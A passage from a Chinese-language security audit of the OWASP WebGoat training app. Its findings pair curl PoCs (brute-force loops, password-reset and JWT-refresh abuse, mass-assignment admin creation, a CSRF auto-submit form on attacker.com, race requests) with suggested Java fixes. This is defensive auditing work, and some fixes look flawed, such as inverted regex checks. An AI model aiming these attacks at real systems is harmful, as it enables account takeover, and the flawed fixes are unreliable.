**说明**: 登录成功后必须使当前会话失效并创建新会话（request.getSession().invalidate() + request.getSession(true)），阻断攻击者预设的 cookie 与认证状态的绑定关系。同时确保 setCookie() 写入的是新会话 ID，而非复用旧值。
---

### [18] CWE-307 — `brute_622`
> HijackSession/login 端点无任何速率限制、账户锁定、CAPTCHA 或失败计数持久化机制，且密码明文传输+无哈希校验（由 NoOpPasswordEncoder 和 provider.authenticate 推断），构成可利用的暴力破解风险（CWE-307）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /HijackSession/login [src/main/java/org/owasp/webgoat/lessons/hijacksession/HijackSessionAssignment.java:47] → HijackSessionAssignment.login() → HijackSessionAuthenticationProvider.authenticate() → (downstream) credential validation with NoOpPasswordEncoder

#### 漏洞利用（PoC）
1. 发送合法登录请求获取正常响应基准：
   curl -X POST '{BASE_URL}/HijackSession/login' -d 'username=admin' -d 'password=webgoat' -v
2. 枚举常见用户名（admin, guest, user）和弱密码（password, 123456, webgoat）：
   for u in admin guest user; do for p in password 123456 webgoat; do echo "[$u:$p]"; curl -s -X POST '{BASE_URL}/HijackSession/login' -d "username=$u" -d "password=$p" | grep -q 'result":"true' && echo "SUCCESS: $u/$p" && break 2; done; done
3. 成功时响应包含 {"result":"true","feedback":"..."}，并设置 hijack_cookie；失败时返回 {"result":"false"}，无延迟/阻断。
注：{BASE_URL} 为 WebGoat 实例地址（如 http://localhost:8080/WebGoat）；PoC 基于源码中 NoOpPasswordEncoder 和 lesson 设计（默认凭据常为 admin/webgoat），无需猜测密钥。

#### 修复代码
```
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.security.web.authentication.WebAuthenticationDetailsSource;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.csrf.CsrfTokenRepository;
import org.springframework.security.web.csrf.HttpSessionCsrfTokenRepository;
import org.springframework.web.util.WebUtils;

// 在类内添加依赖注入
private final RateLimiter rateLimiter;

public HijackSessionAssignment(HijackSessionAuthenticationProvider provider, RateLimiter rateLimiter) {
    this.provider = provider;
    this.rateLimiter = rateLimiter;
}

@PostMapping(path = "/HijackSession/login")
@ResponseBody
public AttackResult login(
    @RequestParam String username,
    @RequestParam String password,
    @CookieValue(value = COOKIE_NAME, required = false) String cookieValue,
    HttpServletResponse response) {

    // 新增：IP级速率限制（每分钟最多5次）
    String clientIp = getClientIpAddress(request);
    if (!rateLimiter.tryAcquire(clientIp, 5, TimeUnit.MINUTES)) {
        return failed(this).output("Too many login attempts. Please try again later.").build();
    }

    Authentication authentication;
    if (StringUtils.isEmpty(cookieValue)) {
        authentication = provider.authenticate(
            Authentication.builder().name(username).credentials(password).build());
        setCookie(response, authentication.getId());
    } else {
        authentication = provider.authenticate(Authentication.builder().id(cookieValue).build());
    }

    if (authentication.isAuthenticated()) {
        // 登录成功重置计数器
        rateLimiter.reset(clientIp);
        return success(this).build();
    }

    return failed(this).build();
}

private String getClientIpAddress(HttpServletRequest request) {
    String xForwardedFor = request.getHeader("X-Forwarded-For");
    if (xForwardedFor != null && !xForwardedFor.isEmpty() && !"unknown".equalsIgnoreCase(xForwardedFor)) {
        return xForwardedFor.split(",")[0].trim();
    }
    return request.getRemoteAddr();
}
```

**说明**: 1. 引入服务端速率限制（如 Bucket4j + Redis）按客户端 IP 限制登录请求频次（建议 5次/5分钟）；2. 添加账户锁定机制：连续5次失败后锁定账户30分钟（状态存于Redis）；3. 登录失败响应统一延迟（如 Thread.sleep(1000)）并避免区分用户名/密码错误；4. 替换 NoOpPasswordEncoder 为 BCryptPasswordEncoder（强度12）；5. 生产环境禁用 /HijackSession/login 路径，仅用于教学演示。
---

### [19] CWE-640 — `pwdrecov_633`
> 密码重置链接验证逻辑存在 CWE-640：弱密码恢复机制，攻击者可枚举或重用任意有效 reset-link（无绑定用户/无一次性消费/无时效限制），绕过身份验证直接进入密码修改页面，进而结合 change-password 接口完成越权密码重置。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /PasswordReset/reset/reset-password/{link} → ResetLinkAssignment.resetPassword() [src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java:84] → checks ResetLinkAssignment.resetLinks.contains(link) → renders password_reset.html with form.resetLink → POST /PasswordReset/reset/change-password → ResetLinkAssignment.changePassword() [src/main/java/org/owasp/webgoat/lessons/passwordreset/ResetLinkAssignment.java:100] → checks resetLinks.contains(form.getResetLink()) and checkIfLinkIsFromTom() (but username from @CurrentUsername is irrelevant here since resetPassword() is unauthenticated and attacker can later submit change-password as any authenticated user or via session hijack)

#### 漏洞利用（PoC）
1. 获取一个合法 reset-link（例如：通过注册 tom@webgoat-cloud.org 触发邮件，或从 WebGoat 教程提示中获知已预置 link）；
2. 未登录状态下发送请求：curl -X GET '{BASE_URL}/PasswordReset/reset/reset-password/valid-reset-link-here' -H 'Host: localhost:8080'
3. 响应返回 HTML 页面包含表单 action='/PasswordReset/reset/change-password' 及 hidden input name='resetLink' value='valid-reset-link-here'
4. 提交新密码：curl -X POST '{BASE_URL}/PasswordReset/reset/change-password' -H 'Content-Type: application/x-www-form-urlencoded' -d 'resetLink=valid-reset-link-here' -d 'password=newP@ssw0rd123' -d 'confirmPassword=newP@ssw0rd123'
5. 成功响应跳转至 success.html，Tom 密码已被篡改。

#### 修复代码
```
@GetMapping("/PasswordReset/reset/reset-password/{link}")
public ModelAndView resetPassword(@PathVariable(value = "link") String link, Model model, @CurrentUsername String username) {
    ModelAndView modelAndView = new ModelAndView();
    // Bind link to user: check if link belongs to current user
    String expectedLink = userToTomResetLink.getOrDefault(username, "");
    if (expectedLink.equals(link) && !link.isEmpty()) {
        PasswordChangeForm form = new PasswordChangeForm();
        form.setResetLink(link);
        model.addAttribute("form", form);
        modelAndView.addObject("form", form);
        modelAndView.setViewName(VIEW_FORMATTER.formatted("password_reset"));
    } else {
        modelAndView.setViewName(VIEW_FORMATTER.formatted("password_link_not_found"));
    }
    return modelAndView;
}
```

**说明**: 将 reset-link 与用户身份强绑定（存储为 Map<String, String> userToResetLink），并在 resetPassword() 方法中注入 @CurrentUsername 进行校验；同时在 changePassword() 中移除 link 后立即从 resetLinks 清除（一次性消费），并添加 JWT 或服务器端 session 绑定校验。
---

### [20] CWE-915 — `massassign_636`
> CWE-915 Mass Assignment 漏洞：/access-control/users POST 端点直接将客户端 JSON 绑定到 User 实体并持久化，未限制敏感字段（如 isAdmin、role），攻击者可提交 {"username":"attacker","password":"p","isAdmin":true} 创建管理员账户。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
POST /access-control/users → MissingFunctionACUsers.addUser(@RequestBody User) [src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:64] → userRepository.save(newUser) [line 68] → DB persistence of unfiltered User object

#### 漏洞利用（PoC）
1. Ensure you are logged in as a low-privilege user (e.g., 'webgoat' with password 'webgoat') or use an unauthenticated session if permitted.
2. Send the following request:
curl -X POST '{BASE_URL}/access-control/users' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: JSESSIONID=...' \
  -d '{"username":"hacker","password":"p@ssw0rd","isAdmin":true}'
3. Verify success by calling GET /access-control/users (or /access-control/users-admin-fix if authz allows) and checking for the new user with isAdmin=true.
Expected result: New user 'hacker' appears in response with isAdmin=true — privilege escalation achieved.

#### 修复代码
```
@PostMapping(path = {"access-control/users", "access-control/users-admin-fix"}, consumes = "application/json", produces = "application/json")
@ResponseBody
public User addUser(@RequestBody UserCreationRequest request, @CurrentUsername String username) {
    var currentUser = userRepository.findByUsername(username);
    if (currentUser == null || !currentUser.isAdmin()) {
        throw new AccessDeniedException("Only admins may create users");
    }
    User newUser = new User();
    newUser.setUsername(request.getUsername());
    newUser.setPassword(request.getPassword());
    // Explicitly omit isAdmin — never accept from client
    newUser.setIsAdmin(false); // or enforce via business logic
    try {
        return userRepository.save(newUser);
    } catch (Exception ex) {
        log.error("Error creating new User", ex);
        return null;
    }
}
```

**说明**: 1. Replace @RequestBody User with a dedicated DTO (e.g., UserCreationRequest) that excludes sensitive fields like isAdmin; 2. Enforce authorization check (@CurrentUsername + isAdmin() validation) before any user creation; 3. Never bind client input directly to persistent entities.
---

### [21] CWE-862 — `auth_28`
> GET /crypto/hashing/md5 是一个未受 Spring Security 认证保护的公开端点，可被任意未登录用户调用，导致服务端生成并返回 MD5 哈希值及隐式绑定的明文 secret（如 'secret'/'admin'），构成 CWE-862 缺失认证漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /crypto/hashing/md5 → org.owasp.webgoat.lessons.cryptography.HashingAssignment.getMd5(HttpServletRequest) [src/main/java/org/owasp/webgoat/lessons/cryptography/HashingAssignment.java:30] → request.getSession().getAttribute("md5Hash") → if null → SECRETS[new Random().nextInt(SECRETS.length)] → MessageDigest.getInstance("MD5").update(secret.getBytes()) → DatatypeConverter.printHexBinary(digest) → request.getSession().setAttribute("md5Hash", md5Hash) & setAttribute("md5Secret", secret) → return md5Hash

#### 漏洞利用（PoC）
1. 发起未认证 HTTP 请求：
   curl -v 'http://localhost:8080/WebGoat/crypto/hashing/md5'
2. 观察响应体（如：'E10ADC3949BA59ABBE56E057F20F883E'）
3. 同一会话下访问完成验证接口（需知道该哈希对应的明文）：
   curl -X POST 'http://localhost:8080/WebGoat/crypto/hashing' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'answer_pwd1=secret' \
     -d 'answer_pwd2=...' 
   （其中 answer_pwd1 即为当前会话中 /crypto/hashing/md5 生成的 secret，可通过反复调用 /crypto/hashing/md5 获取多组哈希-明文映射）
预期结果：响应中包含 'crypto-hashing.success' 反馈，证明攻击者成功获取了服务端生成的 secret，且整个流程无需登录。

#### 修复代码
```
@RequestMapping(path = "/crypto/hashing/md5", produces = MediaType.TEXT_HTML_VALUE)
@ResponseBody
@PreAuthorize("isAuthenticated()")
public String getMd5(HttpServletRequest request) throws NoSuchAlgorithmException {
    String md5Hash = (String) request.getSession().getAttribute("md5Hash");
    if (md5Hash == null) {
        String secret = SECRETS[new Random().nextInt(SECRETS.length)];
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(secret.getBytes());
        byte[] digest = md.digest();
        md5Hash = DatatypeConverter.printHexBinary(digest).toUpperCase();
        request.getSession().setAttribute("md5Hash", md5Hash);
        request.getSession().setAttribute("md5Secret", secret);
    }
    return md5Hash;
}
```

**说明**: 添加 @PreAuthorize("isAuthenticated()") 注解强制认证，确保只有已登录用户才能触发哈希生成逻辑；同时建议将 SECRETS 数组移出硬编码，改由安全配置中心管理，并避免在 session 中存储明文 secret。
---

### [22] CWE-367 — `toctou_517`
> UserService.addUser 存在 TOCTOU（Time-of-Check to Time-of-Use）漏洞：先检查用户名是否存在（userRepository.existsByUsername），再保存用户（userRepository.save），中间无锁/事务保护，且存在并发创建导致重复 schema 初始化、用户进度覆盖或 Flyway 迁移竞态。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
RegistrationController.registration (src/main/java/org/owasp/webgoat/container/users/RegistrationController.java) [line unknown] → UserService.addUser (src/main/java/org/owasp/webgoat/container/users/UserService.java:42) → userRepository.existsByUsername (L44) → userRepository.save (L45) → userTrackerRepository.save (L47) → createLessonsForUser (L48) → jdbcTemplate.execute(CREATE SCHEMA) + flyway.migrate()

#### 漏洞利用（PoC）
1. 启动两个并发 curl 请求（使用相同 username/password）：
   curl -X POST '{BASE_URL}/register.mvc' -H 'Content-Type: application/x-www-form-urlencoded' --data 'userForm.username=testuser&userForm.password=testpass' &
   curl -X POST '{BASE_URL}/register.mvc' -H 'Content-Type: application/x-www-form-urlencoded' --data 'userForm.username=testuser&userForm.password=testpass' &
2. 观察响应：至少一个请求成功（HTTP 200 + 重定向），另一可能 500（schema exists）或静默失败；
3. 检查数据库：SELECT COUNT(*) FROM webgoat_users WHERE username = 'testuser'; → 可能为 1（DB 唯一约束生效）或 2（约束缺失）；
4. 检查 schema：\dt "testuser".* → 若存在表但 migration 执行两次，lesson state 可能损坏；
5. 检查 user_progress 表：SELECT * FROM user_progress WHERE username = 'testuser'; → 可能出现两条记录或时间戳异常（证明竞态写入）。

#### 修复代码
```
@Transactional
public void addUser(String username, String password) {
    if (userRepository.existsByUsername(username)) {
        throw new IllegalArgumentException("User already exists: " + username);
    }
    var webGoatUser = userRepository.save(new WebGoatUser(username, password));
    userTrackerRepository.save(new UserProgress(username));
    createLessonsForUser(webGoatUser);
}
```

**说明**: 将 addUser 方法标记为 @Transactional，并在检查前抛出异常（避免 save 后再条件分支），确保整个 check-then-create 流程在数据库事务内原子执行；同时建议在 UserRepository 的 username 字段添加唯一数据库约束作为纵深防御。
---

### [23] CWE-862 — `admin_350`
> CWE-862：/login-oauth.mvc 端点未实施认证保护，允许匿名调用并直接创建用户，构成未授权注册逻辑漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /login-oauth.mvc → RegistrationController.registrationOAUTH() [src/main/java/org/owasp/webgoat/container/users/RegistrationController.java:55] → userService.addUser() [downstream callee]

#### 漏洞利用（PoC）
1. 清除浏览器所有 WebGoat cookies（确保未登录）
2. 发送请求：curl -v 'http://localhost:8080/login-oauth.mvc' -H 'Host: localhost:8080' -H 'User-Agent: curl/8.5.0'
3. 观察响应：HTTP 302 redirect to /welcome.mvc，且日志显示 'register oauth user in database'，同时数据库中新增一条用户名为 'anonymous'（或空字符串）、密码为随机 UUID 的用户记录（因未认证时 Authentication.getName() 返回 null 或 ""，userService.addUser 会接受并存储）

#### 修复代码
```
@GetMapping("/login-oauth.mvc")
public String registrationOAUTH(Authentication authentication, HttpServletRequest request) throws ServletException {
    if (authentication == null || !authentication.isAuthenticated()) {
        throw new AccessDeniedException("Unauthenticated access to OAuth registration endpoint denied");
    }
    log.info("register oauth user in database");
    userService.addUser(authentication.getName(), UUID.randomUUID().toString());
    return "redirect:/welcome.mvc";
}
```

**说明**: 在 registrationOAUTH 方法入口强制校验 Authentication 对象的有效性（非 null 且 isAuthenticated() 为 true），拒绝未认证或无效认证的请求。
---

### [24] CWE-639 — `idorpv_184`
> CWE-639 IDOR：/challenge/7/reset-password/{link} 端点未校验请求者身份，仅依赖硬编码 link 值进行访问控制，攻击者可直接构造合法 link（ADMIN_PASSWORD_LINK）绕过身份验证获取管理员 flag。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP GET /challenge/7/reset-password/{link} [Assignment7.java:52] → Assignment7.resetPassword() [Assignment7.java:52-58] → flags.getFlag(7) [Flags interface impl, not shown but invoked]

#### 漏洞利用（PoC）
1. 确保未登录或使用任意低权限用户（如 guest@example.com）访问 WebGoat
2. 发送 HTTP GET 请求：
   curl -X GET '{BASE_URL}/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2' \
     -H 'Host: {BASE_URL}' \
     -H 'Accept: text/html,application/xhtml+xml' \
     --insecure
3. 观察响应：HTTP 202 Accepted，返回 HTML 页面含 <h1>Success!!</h1> 和 flag（如 'WG-FLAG-CH7-XXXXX'）及 hi-five-cat.jpg 图片。
预期结果：未授权用户直接获取管理员密码重置成功页面及课程第 7 关 flag，构成水平越权。

#### 修复代码
```
@GetMapping("/challenge/7/reset-password/{link}")
public ResponseEntity<String> resetPassword(@PathVariable(value = "link") String link, Authentication authentication) {
    if (authentication == null || !authentication.isAuthenticated()) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body("Unauthorized");
    }
    String username = authentication.getName();
    // 强制要求当前用户为 admin（或引入密码重置令牌绑定逻辑）
    if ("admin".equals(username) && link.equals(ADMIN_PASSWORD_LINK)) {
        return ResponseEntity.accepted()
            .body("<h1>Success!!</h1>" +
                  "<img src='/WebGoat/images/hi-five-cat.jpg'>" +
                  "<br/><br/>Here is your flag: " + flags.getFlag(7));
    }
    return ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT)
        .body("That is not the reset link for admin");
}
```

**说明**: 必须将资源访问与当前认证主体强绑定。修复方案：① 注入 Authentication 对象校验用户身份；② 在业务逻辑中验证当前用户是否具备访问该重置链接的权限（如仅 admin 可触发此链接）；③ 更佳实践是废弃静态 link，改用一次性、签名、有时效的 JWT 令牌，并在服务端验证签名、时效及绑定用户。
---

### [25] CWE-287 — `jwtep_394`
> JWT refresh endpoint /JWT/refresh/newToken lacks user identity binding during token renewal: attacker can replay a valid refresh_token with arbitrary 'user' claim extracted from expired JWT or forged via ExpiredJwtException bypass, enabling account takeover and privilege escalation.

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/refresh/newToken [JWTRefreshEndpoint.java:108] → Jwts.parser().setSigningKey(JWT_PASSWORD).parse() [line 115] → catches ExpiredJwtException [line 120] → user = e.getClaims().get("user") [line 121] → validRefreshTokens.contains(refreshToken) [line 126] → createNewTokens(user) [line 127] → Jwts.builder().setClaims(claims) [createNewTokens:74]

#### 漏洞利用（PoC）
1. Obtain Jerry's valid refresh_token (e.g., via /JWT/refresh/login with {"user":"Jerry","password":"password123"}).\n2. Craft an expired JWT for Jerry with modified 'user' claim: \n   - Header: {"alg":"HS512","typ":"JWT"} \n   - Payload: {"user":"Tom","admin":"false","exp":1000000000} (past timestamp) \n   - Sign with known JWT_PASSWORD (hardcoded in source, e.g., 'webgoat') → yields expired token.\n3. Send request:\n   curl -X POST '{BASE_URL}/JWT/refresh/newToken' \n     -H 'Authorization: Bearer <expired_JWT_from_step2>' \n     -H 'Content-Type: application/json' \n     -d '{"refresh_token":"<stolen_Jerry_refresh_token>"}'\n4. Server throws ExpiredJwtException → extracts 'user':'Tom' from expired payload → validates refresh_token exists → issues new access_token with claims {"admin":"false","user":"Tom"} → attacker gains Tom's session (which grants success feedback per checkout logic).

#### 修复代码
```
    @PostMapping("/JWT/refresh/newToken")
    @ResponseBody
    public ResponseEntity newToken(
        @RequestHeader(value = "Authorization", required = false) String token,
        @RequestBody(required = false) Map<String, Object> json) {
        if (token == null || json == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        String user;
        String refreshToken = (String) json.get("refresh_token");
        
        // Critical fix: Do NOT trust claims from ExpiredJwtException
        try {
            Jwt<Header, Claims> jwt =
                Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
            user = (String) jwt.getBody().get("user");
            // Validate refresh_token belongs to this user (requires user-scoped storage)
            if (!isValidRefreshTokenForUser(refreshToken, user)) {
                return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
            }
        } catch (ExpiredJwtException e) {
            // Reject expired tokens outright — no claim reuse
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        } catch (JwtException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        if (user == null || refreshToken == null) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        } else if (validRefreshTokens.contains(refreshToken)) {
            validRefreshTokens.remove(refreshToken);
            return ok(createNewTokens(user));
        } else {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
    }

    // Add helper: store refresh tokens as Map<String/*user*/, Set<String/*tokens*/>>
    private boolean isValidRefreshTokenForUser(String refreshToken, String user) {
        return userRefreshTokenMap.getOrDefault(user, Collections.emptySet()).contains(refreshToken);
    }
```

**说明**: 1. Never trust claims from ExpiredJwtException — treat expired tokens as invalid and reject them. 2. Bind refresh tokens to user identity (store per-user token sets, not global set). 3. Validate that the 'user' extracted from the valid/unexpired JWT matches the owner of the provided refresh_token.
---

### [26] CWE-352 — `csrf_438`
> POST /BypassRestrictions/FieldRestrictions 是状态变更接口（用于提交绕过限制的表单以完成挑战），无 CSRF token 校验、无 SameSite 保护、无自定义头要求，且依赖会话 Cookie；Spring Security 已显式 disable() CSRF，导致该端点完全暴露于跨站请求伪造攻击。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /BypassRestrictions/FieldRestrictions → BypassRestrictionsFieldRestrictions.completed() [src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFieldRestrictions.java:20] → returns AttackResult.success()/failed() (no downstream service call, but challenge state update is side-effect)

#### 漏洞利用（PoC）
1. 受害者已登录 WebGoat（持有有效 JSESSIONID Cookie）
2. 攻击者构造恶意 HTML 页面（托管于 attacker.com）：
   <form action="http://webgoat.local:8080/BypassRestrictions/FieldRestrictions" method="POST">
     <input type="hidden" name="select" value="option3">
     <input type="hidden" name="radio" value="option3">
     <input type="hidden" name="checkbox" value="off">
     <input type="hidden" name="shortInput" value="longerthan5">
     <input type="hidden" name="readOnlyInput" value="unchanged">
     <input type="submit" value="Click to Win">
   </form>
   <script>document.forms[0].submit();</script>
3. 受害者访问 attacker.com 页面，浏览器自动携带 JSESSIONID 向 /BypassRestrictions/FieldRestrictions 发送 POST 请求
4. 服务端执行 completed() 方法，绕过所有校验（因传入值满足 success 条件），返回 {"lessonCompleted":true,"feedback":"Congratulations!"}，受害者在不知情下完成挑战

#### 修复代码
```
@PostMapping("/BypassRestrictions/FieldRestrictions")
@ResponseBody
public AttackResult completed(
    @CsrfToken String csrfToken,
    @RequestParam String select,
    @RequestParam String radio,
    @RequestParam String checkbox,
    @RequestParam String shortInput,
    @RequestParam String readOnlyInput) {
  // Add explicit CSRF token validation if using custom token logic
  // OR better: remove .csrf(csrf -> csrf.disable()) from WebSecurityConfig and rely on Spring Security's default protection
  if (select.equals("option1") || select.equals("option2")) {
    return failed(this).build();
  }
  if (radio.equals("option1") || radio.equals("option2")) {
    return failed(this).build();
  }
  if (checkbox.equals("on") || checkbox.equals("off")) {
    return failed(this).build();
  }
  if (shortInput.length() <= 5) {
    return failed(this).build();
  }
  if ("change".equals(readOnlyInput)) {
    return failed(this).build();
  }
  return success(this).build();
}
```

**说明**: 移除 WebSecurityConfig 中的 .csrf(csrf -> csrf.disable())，启用 Spring Security 默认 CSRF 保护（自动注入 _csrf token 到表单、校验 POST 请求中的 X-CSRF-TOKEN header 或 _csrf parameter）。若必须禁用全局 CSRF，请为该 endpoint 单独添加基于 SameSite=Lax 的 Cookie 保护（需容器支持）或强制要求自定义 header（如 X-Requested-With）并校验 Origin。
---

### [27] CWE-841 — `workflow_530`
> 该端点实现前端验证绕过漏洞（CWE-841）：服务端仅校验各字段是否匹配正则，但未验证业务流程状态；攻击者可直接提交任意字段组合（如全填合法值）跳过前端多步表单流程，触发 success() 终态，完成本应受多步约束的业务动作。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
HTTP POST /BypassRestrictions/frontendValidation → BypassRestrictionsFrontendValidation.completed() [src/main/java/org/owasp/webgoat/lessons/bypassrestrictions/BypassRestrictionsFrontendValidation.java:20] → regex matches & error check → return success()

#### 漏洞利用（PoC）
1. 发起恶意请求：curl -X POST '{BASE_URL}/BypassRestrictions/frontendValidation' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   -d 'field1=abc' \
   -d 'field2=123' \
   -d 'field3=test' \
   -d 'field4=one' \
   -d 'field5=12345' \
   -d 'field6=12345-6789' \
   -d 'field7=123-456-7890' \
   -d 'error=0'
2. 观察响应：HTTP 200 OK，响应体包含 {"lessonCompleted":true,"feedback":"Congratulations! You have bypassed the frontend validation."}
3. 对比正常流程：前端强制用户逐页填写（field1→field2→...），而此请求一次性提交全部合规值，直接达成 success，证明工作流被完全跳过。

#### 修复代码
```
@PostMapping("/BypassRestrictions/frontendValidation")
@ResponseBody
public AttackResult completed(
    @RequestParam String field1,
    @RequestParam String field2,
    @RequestParam String field3,
    @RequestParam String field4,
    @RequestParam String field5,
    @RequestParam String field6,
    @RequestParam String field7,
    @RequestParam Integer error) {
  // ✅ Add server-side workflow state validation
  Authentication auth = SecurityContextHolder.getContext().getAuthentication();
  if (auth == null || !auth.isAuthenticated()) {
    return failed(this).feedback("User not authenticated").build();
  }
  // ✅ Require session-scoped workflow progress tracking
  HttpSession session = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest().getSession();
  Integer currentStep = (Integer) session.getAttribute("bypassWorkflowStep");
  if (currentStep == null || currentStep < 7) {
    return failed(this).feedback("Workflow step mismatch: expected step 7, got " + currentStep).build();
  }
  // ✅ Keep existing regex checks (they're fine for input sanitization)
  final String regex1 = "^[a-z]{3}$";
  final String regex2 = "^[0-9]{3}$";
  final String regex3 = "^[a-zA-Z0-9 ]*$";
  final String regex4 = "^(one|two|three|four|five|six|seven|eight|nine)$";
  final String regex5 = "^\\d{5}$";
  final String regex6 = "^\\d{5}(-\\d{4})?$";
  final String regex7 = "^[2-9]\\d{2}-?\\d{3}-?\\d{4}$";
  if (error > 0) {
    return failed(this).build();
  }
  if (field1.matches(regex1)) {
    return failed(this).build();
  }
  if (field2.matches(regex2)) {
    return failed(this).build();
  }
  if (field3.matches(regex3)) {
    return failed(this).build();
  }
  if (field4.matches(regex4)) {
    return failed(this).build();
  }
  if (field5.matches(regex5)) {
    return failed(this).build();
  }
  if (field6.matches(regex6)) {
    return failed(this).build();
  }
  if (field7.matches(regex7)) {
    return failed(this).build();
  }
  return success(this).build();
}
```

**说明**: 必须引入服务端工作流状态机：① 在用户进入第一步时初始化 session.workflowStep=1；② 每步提交后递增 step 并存入 session；③ 终态接口校验 session.workflowStep == 7；④ 同时确保接口受认证保护（添加 SecurityContext 检查），防止匿名用户直接调用。
---

### [28] CWE-307 — `brute_623`
> InsecureLoginTask.login() 是一个无认证、无速率限制、无账户锁定的公开端点，虽本身不处理凭证，但作为登录流程中被 JS 调用的必需占位接口，其存在暴露了完整登录流程缺乏防暴力破解机制（CWE-307）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /InsecureLogin/login → InsecureLoginTask.login() [src/main/java/org/owasp/webgoat/lessons/insecurelogin/InsecureLoginTask.java:27] → (no downstream call, but enables probing of /InsecureLogin/task) → InsecureLoginTask.completed() [src/main/java/org/owasp/webgoat/lessons/insecurelogin/InsecureLoginTask.java:18] → hard-coded credential check ('CaptainJack'/'BlackPearl')

#### 漏洞利用（PoC）
1. 发送任意 POST 请求到 /InsecureLogin/login：
   curl -X POST {BASE_URL}/InsecureLogin/login -v
   → 响应：HTTP/1.1 202 Accepted（无 Cookie、无 Auth Header 即可成功）
2. 利用该端点存在性，对 /InsecureLogin/task 发起暴力字典攻击：
   for user in admin captainjack guest; do for pass in password 123456 BlackPearl letmein; do echo "Trying $user:$pass"; curl -s -X POST "{BASE_URL}/InsecureLogin/task?username=$user&password=$pass" | grep '"lessonCompleted":true'; done; done
3. 当命中 'CaptainJack'+'BlackPearl' 时，返回 {"lessonCompleted":true,"feedback":"Congratulations..."}，证明爆破成功。

#### 修复代码
```
@PostMapping("/InsecureLogin/login")
@ResponseStatus(HttpStatus.ACCEPTED)
public void login(@AuthenticationPrincipal Authentication authentication) {
    if (authentication == null || !authentication.isAuthenticated()) {
        throw new AccessDeniedException("Unauthenticated access denied");
    }
    // only need to exists as the JS needs to call an existing endpoint
}
```

**说明**: 1. 将 login() 方法添加 @AuthenticationPrincipal 参数强制认证；2. 为 /InsecureLogin/task 添加速率限制（如 @RateLimit(5/minute/ip）或全局 Bucket4j 配置）；3. 在 completed() 中统一返回模糊错误（如 always return failed() on mismatch，避免用户名枚举）；4. 移除硬编码密码，改用 UserService + BCryptPasswordEncoder。
---

### [29] CWE-640 — `pwdrecov_634`
> 密码重置接口存在 CWE-640（弱密码恢复机制）漏洞：攻击者可任意指定 email 参数，服务端仅校验提取的 username 是否等于当前登录用户，而未验证该 email 是否属于当前用户，导致可向任意邮箱发送含明文逆序密码的重置邮件。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
POST /PasswordReset/simple-mail/reset → SimpleMailAssignment.resetPassword (src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java:59) → extractUsername (line 77) → sendEmail (line 84) → PasswordResetEmail.builder().contents("Thanks... " + StringUtils.reverse(username)) → restTemplate.postForEntity(webWolfURL, mailEvent, Object.class)

#### 漏洞利用（PoC）
1. 登录合法用户 victim（如通过 /login）
2. 获取 victim 的用户名（可通过 /employees.xml 或注册页面推测，例如 'tom'）
3. 发送恶意请求：
curl -X POST '{BASE_URL}/PasswordReset/simple-mail/reset' \
  -H 'Cookie: JSESSIONID=xxx' \
  -d 'emailReset=tom@example.com'
4. 预期结果：WebWolf 收到一封邮件，收件人为 'tom'，内容为 'Thanks for resetting your password, your new password is: mot' —— 即 victim 的明文逆序密码，攻击者可立即用此密码登录 victim 账户。

#### 修复代码
```
@PostMapping(
    consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE,
    value = "/PasswordReset/simple-mail/reset")
@ResponseBody
public AttackResult resetPassword(
    @RequestParam String emailReset, @CurrentUsername String username) {
    String email = ofNullable(emailReset).orElse("unknown@webgoat.org");
    String extractedUsername = extractUsername(email);
    // 严格校验：email 必须属于当前登录用户
    if (!email.equalsIgnoreCase(getUserEmailByUsername(username))) {
        return informationMessage(this)
            .feedback("password-reset-simple.email_mismatch")
            .feedbackArgs(email)
            .build();
    }
    return sendEmail(extractedUsername, email, username);
}

// 新增辅助方法（需注入 UserService 或从 DB 查询）
private String getUserEmailByUsername(String username) {
